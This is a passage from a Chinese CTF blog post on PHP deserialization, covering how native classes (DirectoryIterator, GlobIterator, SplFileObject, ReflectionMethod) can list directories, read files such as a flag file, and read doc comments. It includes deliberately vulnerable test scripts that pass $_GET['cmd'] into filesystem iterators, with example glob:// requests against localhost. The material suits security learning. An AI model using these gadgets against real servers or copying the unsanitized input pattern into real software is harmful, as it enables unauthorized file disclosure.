<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DirectoryIterator</span> <span class="keyword">extends</span> <span class="title">SplFileInfo</span> <span class="keyword">implements</span> <span class="title">SeekableIterator</span> </span>{</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>(<span class="keyword">string</span> <span class="variable">$directory</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">current</span>(): <span class="keyword">mixed</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getBasename</span>(<span class="keyword">string</span> <span class="variable">$suffix</span> = <span class="string">""</span>): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getExtension</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getFilename</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">isDot</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">key</span>(): <span class="keyword">mixed</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">next</span>(): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">rewind</span>(): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">seek</span>(<span class="keyword">int</span> <span class="variable">$offset</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">valid</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="comment">/* 继承的方法 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getATime</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getBasename</span>(<span class="keyword">string</span> <span class="variable">$suffix</span> = <span class="string">""</span>): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getCTime</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getExtension</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getFileInfo</span>(?<span class="keyword">string</span> <span class="variable">$class</span> = <span class="literal">null</span>): <span class="built_in">SplFileInfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getFilename</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getGroup</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getInode</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getLinkTarget</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getMTime</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getOwner</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPath</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPathInfo</span>(?<span class="keyword">string</span> <span class="variable">$class</span> = <span class="literal">null</span>): ?<span class="built_in">SplFileInfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPathname</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPerms</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getRealPath</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getSize</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getType</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isDir</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isExecutable</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isFile</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isLink</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isReadable</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isWritable</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">openFile</span>(<span class="keyword">string</span> <span class="variable">$mode</span> = <span class="string">"r"</span>, <span class="keyword">bool</span> <span class="variable">$useIncludePath</span> = <span class="literal">false</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="built_in">SplFileObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">setFileClass</span>(<span class="keyword">string</span> <span class="variable">$class</span> = <span class="title class_">SplFileObject</span>::<span class="variable language_">class</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">setInfoClass</span>(<span class="keyword">string</span> <span class="variable">$class</span> = <span class="title class_">SplFileInfo</span>::<span class="variable language_">class</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span></span><br><span class="line">}  </span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">public __toString(): string    //这个是我们最常用的</span><br><span class="line">//可以以字符串形式获取文件名</span><br><span class="line">配合glob://协议，读取目录</span><br></pre></td></tr></tbody></table></figure>

<p><strong>测试</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) {</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>() . <span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?cmd=glob:///*</span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711212343754.png" alt="image-20240711212343754"></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Filesystemlterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) {</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>() . <span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?cmd=glob:///phpstudy_pro/WWW/*</span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711212128206.png" alt="image-20240711212128206"></p>
<p>（2）<a target="_blank" rel="noopener" href="https://www.php.net/globiterator">GlobIterator类</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br></pre></td></tr></tbody></table></figure>

<p>借助于模式匹配去查找路径，而不需要借助glob，而且这个类是继承于Filesystemlterator</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711212534276.png" alt="image-20240711212534276"></p>
<p>GlobIterator类的特点只需要知道部分名称可以进行遍历，内置的魔术方法是__toString。</p>
<p>示例</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">"/*flag*"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>测试</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) {</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>() . <span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?cmd=/phpstudy_pro/WWW/*</span><br></pre></td></tr></tbody></table></figure>

<p>可以发现我们不需要利用glob协议</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711212841290.png" alt="image-20240711212841290"></p>
<h4 id="2-文件读取"><a href="#2-文件读取" class="headerlink" title="2.文件读取"></a>2.文件读取</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/class.splfileinfo.php">SplFileInfo</a></p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711213226541.png" alt="image-20240711213226541"></p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作;</p>
<p>SplFileObject::__toString — Returns the path to the file as a string //将文件路径作为字符串返回</p>
<p>测试</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">'D:\\phpstudy_pro\\WWW\\flag.txt'</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>){</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711213517833.png" alt="image-20240711213517833"></p>
<h4 id="3-读取注释内容"><a href="#3-读取注释内容" class="headerlink" title="3.读取注释内容"></a>3.读取注释内容</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionmethod.php">ReflectionMethod</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PHP 5 &gt;= 5.1.0, PHP 7, PHP 8</span><br><span class="line">只能读取/** */注释的内容</span><br></pre></td></tr></tbody></table></figure>

<p>测试</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这只是个测试</span></span><br><span class="line"><span class="comment">     * getDocComment方法是否能获得注释</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">'test'</span>,<span class="string">'getA'</span>);<span class="comment">//第一个参数填需要读取注释的类名，第二个参数填类里面的函数名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;<span class="title function_ invoke__">getDocComment</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>





<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240711213934269.png" alt="image-20240711213934269"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://p4tt0n.github.io/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">命令执行</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/30/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">命令执行</div></div></a></div><div><a href="/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Nodejs沙箱逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">Nodejs沙箱逃逸</div></div></a></div><div><a href="/2024/10/09/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-user-ini/" title="深入浅出.user.ini"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">深入浅出.user.ini</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">类的基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">类的定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.2.</span> <span class="toc-text">类的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.3.</span> <span class="toc-text">类的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E8%B5%8B%E5%80%BC"><span class="toc-number">1.1.4.</span> <span class="toc-text">实例化和赋值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">1.1.5.</span> <span class="toc-text">类的修饰符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">序列化的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">对象的序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">反序列化的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.2.</span> <span class="toc-text">反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.3.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#construct"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">__construct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">__destruct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-number">1.3.3.6.</span> <span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-number">1.3.3.7.</span> <span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#callStatic"><span class="toc-number">1.3.3.8.</span> <span class="toc-text">__callStatic()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get"><span class="toc-number">1.3.3.9.</span> <span class="toc-text">__get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set"><span class="toc-number">1.3.3.10.</span> <span class="toc-text">__set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isset"><span class="toc-number">1.3.3.11.</span> <span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unset"><span class="toc-number">1.3.3.12.</span> <span class="toc-text">__unset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clone"><span class="toc-number">1.3.3.13.</span> <span class="toc-text">__clone()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91%E8%A7%84%E5%88%99"><span class="toc-number">1.3.3.14.</span> <span class="toc-text">魔术方法触发规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.3.3.15.</span> <span class="toc-text">pop链构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">1.3.4.</span> <span class="toc-text">字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">字符减少</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">字符增多</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.5.</span> <span class="toc-text">引用的利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.6.</span> <span class="toc-text">session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.7.</span> <span class="toc-text">phar反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.8.</span> <span class="toc-text">原生类反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">1.遍历目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">2.文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%E6%B3%A8%E9%87%8A%E5%86%85%E5%AE%B9"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">3.读取注释内容</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/11/2025%E5%B9%B4%E7%8D%AC%E8%B1%B8%E6%9D%AF%E6%9C%8D%E5%8A%A1%E5%99%A8wp/" title="2025年獬豸杯服务器wp">2025年獬豸杯服务器wp</a><time datetime="2025-04-11T11:59:20.000Z" title="发表于 2025-04-11 19:59:20">2025-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/11/2021%E5%B9%B4%E9%95%BF%E5%AE%89%E6%9D%AF-apk%E5%88%86%E6%9E%90wp/" title="2021年长安杯-apk分析wp">2021年长安杯-apk分析wp</a><time datetime="2025-04-11T08:02:25.000Z" title="发表于 2025-04-11 16:02:25">2025-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/11/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF-apk%E5%88%86%E6%9E%90wp/" title="2024獬豸杯-apk分析wp">2024獬豸杯-apk分析wp</a><time datetime="2025-04-11T07:59:51.000Z" title="发表于 2025-04-11 15:59:51">2025-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/10/2024FIC%E7%BA%BF%E4%B8%8A%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8wp/" title="2024FIC线上赛-服务器wp">2024FIC线上赛-服务器wp</a><time datetime="2025-04-10T01:53:16.000Z" title="发表于 2025-04-10 09:53:16">2025-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/" title="春秋云镜privilege-wp">春秋云镜privilege-wp</a><time datetime="2025-03-02T10:50:47.000Z" title="发表于 2025-03-02 18:50:47">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" 